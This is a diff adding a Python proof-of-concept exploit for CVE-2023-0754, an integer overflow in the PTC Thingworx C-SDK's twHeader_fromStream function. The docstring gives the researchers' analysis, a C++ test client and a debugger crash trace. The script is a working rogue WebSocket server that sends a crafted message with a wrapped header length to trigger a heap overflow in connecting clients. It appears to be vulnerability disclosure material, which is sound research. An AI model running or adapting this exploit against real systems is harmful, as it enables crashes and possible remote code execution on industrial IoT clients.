@@ -1,0 +1,321 @@
+#!/usr/bin/env python3
+"""
+PTC Thingworx C-SDK twHeader_fromStream Integer Overflow Remote Code Execution Vulnerability
+IDS: SRC-2023-0001, CVE-2023-0754
+Download: https://developer.thingworx.com/-/media/developerportal/SDK_Files/C-SDK-2_2_12.zip
+Found by: Chris Anastasio and Steven Seeley of Incite Team
+
+# Summary:
+
+An integer overflow vulnerability exists in the parsing of multipart message responses when allocating a heap buffer. An attacker can leverage this to write outside of a heap buffer and gain remote code execution against a vulnerable client in some contexts.
+
+# Vulnerability Analysis:
+
+Inside of the twHeader_fromStream function:
+
+```c
+twHeader * twHeader_fromStream(twStream * s) {
+    twHeader * hdr;
+    int cnt = 0;
+    int stringSize = 0;
+    if (!s) return 0;
+    hdr = (twHeader *)TW_CALLOC(sizeof(twHeader), 1);
+    if (!hdr) return 0;
+
+    while (cnt < 2) {
+        unsigned char size[4];
+        /* Get the first byte to check the size */
+        twStream_GetBytes(s, &size[0], 1);
+        if (size[0] > 127) {
+            /* Need the full 4 bytes */
+            twStream_GetBytes(s, &size[1], 3);
+            stringSize = size[0] * 0x1000000 + size[1] * 0x10000 + size[2] * 0x100 + size[3]; // 1
+        } else {
+            stringSize = size[0];
+        }
+        if (cnt) {
+            hdr->value = (char *)TW_CALLOC(stringSize + 1, 1); // 2
+            if (hdr->value) twStream_GetBytes(s, hdr->value, stringSize); // 3
+        } else {
+            hdr->name = (char *)TW_CALLOC(stringSize + 1, 1); // 4
+            if (hdr->name) twStream_GetBytes(s, hdr->name, stringSize); // 5
+        }
+        cnt++;
+    }
+    if (!hdr->name || !hdr->value) {
+        TW_LOG(TW_ERROR,"twHeader_fromStream: Error allocating header name or value");
+        twHeader_Delete(hdr);
+    }
+    return NULL;
+}
+```
+
+At [1] is the attacker controlled string size. At [2] an int wrap occurs during allocation and finally at [3] a wild copy occurs in `twStream_GetBytes`. A second bug exists  at [4] and [5] within the else clause.
+
+```c
+int twStream_GetBytes(struct twStream * s, void * buf, uint32_t count) {
+    if (!s) {
+        TW_LOG(TW_ERROR,"twStream_GetBytes: NULL Pointer passed in");
+        return TW_INVALID_PARAM;
+    }
+    if (s->file) {
+        if (TW_FREAD(buf, count, 1, s->file) < 0) return TW_ERROR_READING_FILE;
+        s->ptr += count;
+        return TW_OK;
+    }
+    if (s->ptr + count > s->data + s->length) {
+        TW_LOG(TW_WARN,"twStream_GetBytes: byte count of %d would exceed the length of %d",
+            count, s->length);
+        count = s->data + s->length - s->ptr;
+    }
+    memcpy(buf, s->ptr, count); // wild copy
+    s->ptr += count;
+    return TW_OK;
+}
+```
+
+# Proof of Concept
+
+The vulnerability was discovered in `KEPServerEX-6.11.718.0.exe` and later confirmed by crafting a vulnerable client using the provided C-SDK:
+
+```c++
+#define WIN32_LEAN_AND_MEAN
+#include "twOSPort.h"
+#include "twLogger.h"
+#include "twApi.h"
+#include "twFileManager.h"
+#include "twTunnelManager.h"
+
+#include <stdio.h>
+#include <string.h>
+#include <string>
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
+
+void appKeyCallback(char* appKeyBuffer, unsigned int maxLength) {
+    strcpy_s(appKeyBuffer, maxLength, "717c9dc1-7b0f-4624-b3b9-aab3db6bcce0");
+}
+
+inline void wait_on_enter()
+{
+    std::string dummy;
+    std::cout << "Enter to continue..." << std::endl;
+    std::getline(std::cin, dummy);
+}
+
+int main(int argc, char* argv[])
+{
+    HMODULE dll_1 = LoadLibraryA("libcrypto-1_1.dll");
+    HMODULE dll_2 = LoadLibraryA("libssl-1_1.dll");
+    char* host;
+    if (argc != 2) {
+        std::cout << "(+) usage: " << argv[0] << " <host>";
+        exit(-1);
+    }
+    host = argv[1];
+    std::cout << "(+) targeting " << host << "!\n";
+    int err = 0;
+    wait_on_enter();
+    err = twApi_Initialize((char*)host, 8080, (char*)"/Thingworx/WS", appKeyCallback, (char*)"test", MESSAGE_CHUNK_SIZE, MESSAGE_CHUNK_SIZE, true);
+    if (err) {
+        std::cout << "(-) error initializing the API: " << GetLastError();
+        exit(err);
+    }
+
+    // disable compression and encryption so we can sniff traffic
+    twApi_DisableWebSocketCompression();
+    twApi_SetGatewayType("IndustrialGateway");
+    twApi_DisableEncryption();
+
+    // setup our connection with 1 try
+    err = twApi_Connect(1000, 1);
+    if (err) {
+        std::cout << "(-) connection failed! " << GetLastError() << "\n";
+        exit(-1);
+    }
+    std::cout << "(+) connection succeeded!\n";
+}
+```
+
+## Debugging:
+
+Don't forget to enable page heap
+
+```
+0:003> .reload /f /i twCSdk.dll
+*** WARNING: Unable to verify checksum for C:\Users\steve\source\repos\Poc\Debug\twCSdk.dll
+
+0:003> g
+ModLoad: 73910000 73962000   C:\Windows\SysWOW64\mswsock.dll
+ModLoad: 75d60000 75dbf000   C:\Windows\SysWOW64\bcryptprimitives.dll
+(30a8.2c10): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00a02000 ecx=0000007f edx=01fffe43 esi=00fac5a0 edi=00fd2fc0
+eip=71373e4a esp=00cff514 ebp=00cff530 iopl=0         nv up ei pl nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203
+VCRUNTIME140D!memcpy+0x4aa:
+71373e4a 660f7f6740      movdqa  xmmword ptr [edi+40h],xmm4 ds:002b:00fd3000=????????????????????????????????
+
+0:000> kv
+ # ChildEBP RetAddr      Args to Child              
+00 00cff518 70b9b89a     00fc51c0 00f9e7a0 ffffffff VCRUNTIME140D!memcpy+0x4aa (FPO: [3,0,2]) (CONV: cdecl) [d:\a01\_work\48\s\src\vctools\crt\vcruntime\src\string\i386\memcpy.asm @ 608] 
+01 00cff530 70ba77ac     00f98380 00fc51c0 ffffffff twCSdk!twStream_GetBytes+0xca (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twBaseTypes.c @ 432] 
+02 00cff560 70ba5593     00f98380 00cff59c cccccccc twCSdk!twHeader_fromStream+0x18c (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessages.c @ 549] 
+03 00cff590 70ba45c2     00f98380 00cff5bc cccccccc twCSdk!twRequestBody_CreateFromStream+0x163 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessages.c @ 607] 
+04 00cff5b0 70baa39b     00f98380 00cff5e8 00000000 twCSdk!twMessage_CreateFromStream+0x172 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessages.c @ 228] 
+05 00cff5d0 70bd0030     00f9e2e8 00fcae00 00000028 twCSdk!msgHandlerOnBinaryMessage+0xdb (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessaging.c @ 424] 
+06 00cff618 70b8a5dd     00f9e2e8 00000000 00cff7a4 twCSdk!twWs_Receive+0xf10 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\websocket\twWebsocket.c @ 936] 
+07 00cff65c 70b8c65e     00cff67c 00002710 00000000 twCSdk!sendMessageBlocking+0x12d (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 487] 
+08 00cff688 70b84b46     00cff6a8 00000000 00cff7a4 twCSdk!twApi_Authenticate+0xbe (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 1526] 
+*** WARNING: Unable to verify checksum for C:\Users\steve\source\repos\Poc\Debug\Poc.exe
+09 00cff698 001460ef     000003e8 00000001 00141032 twCSdk!twApi_Connect+0x156 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 1567] 
+0a 00cff7a4 00146ac3     00000002 00f8aff8 00f93950 Poc!main+0x18f (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\source\repos\Poc\Poc\Poc.cpp @ 59] 
+0b 00cff7c4 00146917     be80cd40 00141032 00141032 Poc!invoke_main+0x33 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
+0c 00cff820 001467ad     00cff830 00146b48 00cff840 Poc!__scrt_common_main_seh+0x157 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
+0d 00cff828 00146b48     00cff840 752bfa29 00a02000 Poc!__scrt_common_main+0xd (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 331] 
+0e 00cff830 752bfa29     00a02000 752bfa10 00cff89c Poc!mainCRTStartup+0x8 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp @ 17] 
+0f 00cff840 76ec7a9e     00a02000 6c2f3161 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
+10 00cff89c 76ec7a6e     ffffffff 76ee8a68 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH])
+11 00cff8ac 00000000     00141032 00a02000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
+```
+
+"""
+import socket
+from base64 import b64encode
+from hashlib import sha1
+import struct
+import re
+HOST = '0.0.0.0'
+PORT = 8080
+
+FIN = 0x80
+PAYLOAD_LEN = 0x7f
+PAYLOAD_LEN_EXT16 = 0x7e
+OPCODE_BINARY = 0x2
+
+# msgCodeEnum
+TWX_PUT = 0x2
+
+# entityTypeEnum
+TW_USERS = 0x32
+
+# characteristicEnum
+TW_PROPERTIES = 0x1
+
+entityName         = b"test"
+characteristicName = b"test"
+
+def calculate_response_key(key):
+    GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
+    hash = sha1(key.encode() + GUID.encode())
+    response_key = b64encode(hash.digest()).strip()
+    return response_key.decode('ASCII')
+
+def make_handshake_response(key):
+    return \
+      'HTTP/1.1 101\r\n'\
+      'X-Content-Type-Options: nosniff\r\n' \
+      'X-XSS-Protection: 1; mode=block\r\n' \
+      'Content-Security-Policy: frame-ancestors \'self\'\r\n' \
+      'X-Frame-Options: SAMEORIGIN\r\n' \
+      'Upgrade: websocket\r\n'              \
+      'Connection: Upgrade\r\n'             \
+      'Sec-WebSocket-Accept: %s\r\n'        \
+      '\r\n' % calculate_response_key(key)
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+
+    # keep attacking the server
+    while True:
+        conn, addr = s.accept()
+        with conn:
+            print('(+) connected by: %s' % addr)
+            while True:
+                data = conn.recv(1024)
+                if not data:
+                    break
+
+                # handle upgrade request
+                if data.startswith(b"GET /Thingworx/WS"):
+                    print("(+) sending upgrade response...")
+                    match = re.search(b"Sec-WebSocket-Key: (.*)", data)
+                    assert match, "(-) no Sec-WebSocket-Key found!"
+                    key = match.group(1).rstrip()
+                    conn.sendall(str.encode(make_handshake_response(key.decode())))
+
+                # handle binary request
+                if data.startswith(b"\x82"):
+                    print("(+) sending exp response...")
+
+                    """
+                    typedef struct twMessage {
+                        enum msgType type;
+                        unsigned char version;
+                        enum msgCodeEnum code;
+                        uint32_t requestId;
+                        uint32_t endpointId;
+                        uint32_t sessionId;
+                        char multipartMarker;
+                        uint32_t length;
+                        void * body;
+                    } twMessage;
+                    """
+
+                    twMessage  = b""
+                    twMessage += struct.pack("<B", 1)                # version
+                    twMessage += struct.pack("<B", TWX_PUT)          # code
+                    twMessage += struct.pack("<I", 0x11111111)       # requestId
+                    twMessage += struct.pack("<I", 0x22222222)       # endpointId
+                    twMessage += struct.pack("<I", 0x33333333)       # sessionId
+                    twMessage += struct.pack("<B", 0x00)             # multipartMarker
+
+                    """
+                    typedef struct twRequestBody {
+                        enum entityTypeEnum entityType;
+                        char * entityName;
+                        enum characteristicEnum characteristicType;
+                        char * characteristicName;
+                        char numHeaders;
+                        twList * headers;
+                        twInfoTable * params;
+                        uint32_t length;
+                    } twRequestBody;
+                    """
+
+                    twMessage += struct.pack("<B", TW_USERS)                # entityType
+                    twMessage += struct.pack("<B", len(entityName))         # len entityName
+                    twMessage += entityName                                 # entityName
+                    twMessage += struct.pack("<B", TW_PROPERTIES)           # entityType
+                    twMessage += struct.pack("<B", len(characteristicName)) # len characteristicName
+                    twMessage += characteristicName                         # characteristicName
+                    twMessage += struct.pack("<B", 0x4)
+
+                    """
+                    typedef struct twHeader {
+                        char * name;
+                        char * value;
+                    } twHeader;
+                    """
+
+                    # here is the bug...
+                    twMessage += struct.pack("<I", 0xffffffff)   # large length for int wrap
+                    twMessage += b"ABCD1234"                     # some junk bytes
+                    header  = bytearray()
+                    payload_length = len(twMessage)
+
+                    # Normal payload
+                    if payload_length <= 125:
+                        header.append(FIN | OPCODE_BINARY)
+                        header.append(payload_length)
+
+                    # Extended payload
+                    elif payload_length >= 126 and payload_length <= 65535:
+                        header.append(FIN | OPCODE_BINARY)
+                        header.append(PAYLOAD_LEN_EXT16)
+                        header.extend(struct.pack(">H", payload_length))
+                    conn.sendall(header + twMessage)
